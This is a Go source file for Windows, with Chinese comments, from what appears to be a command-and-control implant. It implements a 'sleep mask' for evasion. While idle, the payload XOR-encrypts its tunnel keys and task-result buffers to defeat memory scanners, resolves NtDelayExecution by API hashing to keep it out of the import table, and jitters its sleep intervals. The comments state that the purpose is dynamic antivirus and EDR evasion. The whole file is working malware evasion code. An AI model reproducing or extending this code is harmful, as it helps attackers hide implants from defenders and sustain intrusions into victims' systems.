//go:build windows

package main

import (
	"crypto/rand"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"
)

// ─── Sleep mask：休眠期内存加密（动态免杀的第一块）──────────────────────────
//
// 目标：载荷在"长时间不做事"的窗口里（启动随机延迟、HTTP 轮询间隔、重连退避、
// 非工作时段），**内存中不留明文敏感数据**，且休眠不再表现为固定节奏的 `Sleep(大值)`。
// 这一层对抗的是**内存扫描**（扫描器在载荷空闲时遍历进程内存找密钥/任务结果），
// 与"文件特征"无关 —— 也就是说它是真正的动态手法，而不是把二进制里的字符串改一改。
//
// 【能做到 / 做不到 —— 如实说明】
//   - 能：休眠期 XOR 加密**我们自己的堆缓冲**（隧道 SM4 子密钥、任务结果缓存），
//     并让休眠走 ntdll!NtDelayExecution（不经 IAT 明文）、分片 + 随机抖动。
//   - 不能：加密整个镜像/代码段。Go 的 GC、调度器与信号栈时刻在跑，加密代码段或
//     runtime 元数据必崩（这是 Go 植入端做 Ekko/Foliage 式全量 sleep mask 的根本障碍）。
//   - 不能（暂）：原地加密 **string**。Go 字符串可能位于只读段，写入即 ACCESS_VIOLATION；
//     所以 C2 地址、sessionID 这类 string 不在掩码范围。要覆盖它们需先把它们改成 []byte
//     存取（已列入 ROADMAP，不在这里冒险）。
//   - 主 AES 密钥不参与：initAES 之后原始密钥就被零化并置 nil，剩下的是 cipher.AEAD
//     内部的密钥表（Go 侧不可达）。掩码密钥自身拆成两份异或保存，属"抬高门槛"。
//
// 【并发正确性（关键）】
//   - 休眠期若有 goroutine 要用密钥发结果，会读到被加密的数据 → 因此所有用密钥的路径
//     （encrypt/decrypt/initAES/sm4*Tunnel）先调 ensureUnmasked()：它置 abort 标志并
//     轮询等待 masked 变回 false（休眠循环每个分片检查 abort，最多一个分片 ≈300ms 即还原）。
//   - 结果缓存与"发送用的原缓冲"是同一个切片，绝不能出现"缓存被 XOR 了、发出去的也是
//     被 XOR 的内容"。因此提供 maskIfMaskedCopy()：休眠中缓存时存**加密副本**，
//     原缓冲保持明文给发送用；还原时再把副本 XOR 回明文。
//   - masked 状态与批量加解密用 maskStateMu 串起来：cacheResult 只短暂持锁，
//     不会因为"整个休眠窗口都持有状态锁"而被卡住几分钟。

type sleepSecret struct {
	label string
	buf   []byte
}

const sleepMaskKeyLen = 32

var (
	// 掩码密钥拆两份异或保存（真实密钥 = keyA[i] ^ keyB[i]）
	sleepMaskKeyA [sleepMaskKeyLen]byte
	sleepMaskKeyB [sleepMaskKeyLen]byte
	// sleepMaskReady 未取到随机数时保持 false —— 宁可不加密，也不用固定密钥假装加密
	sleepMaskReady atomic.Bool

	// maskStateMu 保护 masked 状态与"批量加解密 + hook"的原子性（不覆盖整个休眠窗口）
	maskStateMu sync.Mutex
	masked      atomic.Bool
	abort       atomic.Bool

	secretsMu sync.Mutex
	secrets   []sleepSecret

	// sleepMaskHook 由 main.go 注册：处理注册表之外的动态缓冲（当前 = 任务结果缓存）
	sleepMaskHook func(encrypt bool)
)

// initSleepMask 生成本进程的掩码密钥。必须在任何 maskedSleep 之前调用一次。
func initSleepMask() {
	if sleepMaskReady.Load() {
		return
	}
	var real [sleepMaskKeyLen]byte
	if _, err := rand.Read(real[:]); err != nil {
		return
	}
	if _, err := rand.Read(sleepMaskKeyA[:]); err != nil {
		return
	}
	for i := 0; i < sleepMaskKeyLen; i++ {
		sleepMaskKeyB[i] = sleepMaskKeyA[i] ^ real[i]
	}
	zeroBytes(real[:])
	sleepMaskReady.Store(true)
}

// registerSecret 注册需要在休眠期加密的堆缓冲（同 label 重复注册 = 替换）。
// 注册表持有切片本身，因此这些内存始终可达，不会被 GC 回收。
func registerSecret(label string, buf []byte) {
	if len(buf) == 0 {
		return
	}
	secretsMu.Lock()
	defer secretsMu.Unlock()
	for i := range secrets {
		if secrets[i].label == label {
			secrets[i].buf = buf
			return
		}
	}
	secrets = append(secrets, sleepSecret{label: label, buf: buf})
}

// applyMask 用掩码密钥流就地 XOR（对称：调用两次即还原）。
func applyMask(buf []byte) {
	if len(buf) == 0 || !sleepMaskReady.Load() {
		return
	}
	for i := range buf {
		j := i & (sleepMaskKeyLen - 1)
		buf[i] ^= sleepMaskKeyA[j] ^ sleepMaskKeyB[j]
	}
}

// maskBufferInPlace 供 main.go 的结果缓存 hook 复用同一密钥流。
func maskBufferInPlace(buf []byte) { applyMask(buf) }

// maskIfMaskedCopy 休眠加密中时返回一份"已加密的副本"（供缓存），否则原样返回。
// 只短暂持有 maskStateMu，不会因为休眠窗口而被卡住。
func maskIfMaskedCopy(buf []byte) []byte {
	if !masked.Load() || len(buf) == 0 {
		return buf
	}
	maskStateMu.Lock()
	defer maskStateMu.Unlock()
	if !masked.Load() {
		return buf
	}
	cp := make([]byte, len(buf))
	copy(cp, buf)
	applyMask(cp)
	return cp
}

// lockSecretsAll 对注册表全体做一次 XOR（加密或还原）。
func lockSecretsAll() {
	secretsMu.Lock()
	for i := range secrets {
		applyMask(secrets[i].buf)
	}
	secretsMu.Unlock()
}

// ensureUnmasked 任何"要用密钥/敏感缓冲"的路径先调它：
// 若正处于加密休眠中，请求提前结束休眠并等它还原（最多等 ~2s，实际 ≤1 个分片）。
func ensureUnmasked() {
	if !masked.Load() {
		return
	}
	abort.Store(true)
	deadline := time.Now().Add(2 * time.Second)
	for masked.Load() && time.Now().Before(deadline) {
		rawSleep(20 * time.Millisecond)
	}
}

// rawSleep 只休眠，不发 time.Sleep/WaitForSingleObject 这类"固定大值休眠"信号：
// 优先 ntdll!NtDelayExecution（走 apihash 解析，不进 IAT 明文），失败才回退 time.Sleep。
func rawSleep(d time.Duration) {
	if d <= 0 {
		return
	}
	ntDelay := resolveAPI("ntdll.dll", "NtDelayExecution")
	if err := ntDelay.Find(); err == nil {
		// 参数为 100ns 单位的相对时间（负值 = 相对）
		interval := int64(d / (100 * time.Nanosecond))
		if interval > 0 {
			neg := -interval
			if r, _, _ := ntDelay.Call(0, uintptr(unsafe.Pointer(&neg))); r == 0 {
				return
			}
		}
	}
	time.Sleep(d)
}

// sleepMaskMaxChunk 单个休眠分片上限：既是"醒来检查 abort"的响应上限，
// 也让唤醒节拍不再是一个固定值。
const sleepMaskMaxChunk = 300 * time.Millisecond

// maskedSleep 加密敏感内存 → 分片休眠 → 还原。d < 2s 或掩码不可用时退化为 rawSleep。
func maskedSleep(d time.Duration) {
	if d <= 0 {
		return
	}
	if !sleepMaskReady.Load() || d < 2*time.Second {
		rawSleep(d)
		return
	}

	abort.Store(false)

	// ── 进入加密态 ──
	maskStateMu.Lock()
	lockSecretsAll()
	if sleepMaskHook != nil {
		sleepMaskHook(true)
	}
	masked.Store(true)
	maskStateMu.Unlock()

	// ── 分片休眠（不持有 maskStateMu：其它 goroutine 仍可短暂进入并拿到正确的加密副本）──
	remaining := d
	for remaining > 0 {
		if abort.Load() {
			break
		}
		chunk := sleepMaskMaxChunk
		if jitter := time.Duration(int(time.Now().UnixNano() % int64(sleepMaskMaxChunk/2))); jitter > 0 {
			chunk -= jitter
		}
		if chunk > remaining {
			chunk = remaining
		}
		rawSleep(chunk)
		remaining -= chunk
	}

	// ── 还原 ──
	maskStateMu.Lock()
	masked.Store(false)
	if sleepMaskHook != nil {
		sleepMaskHook(false)
	}
	lockSecretsAll()
	maskStateMu.Unlock()
}
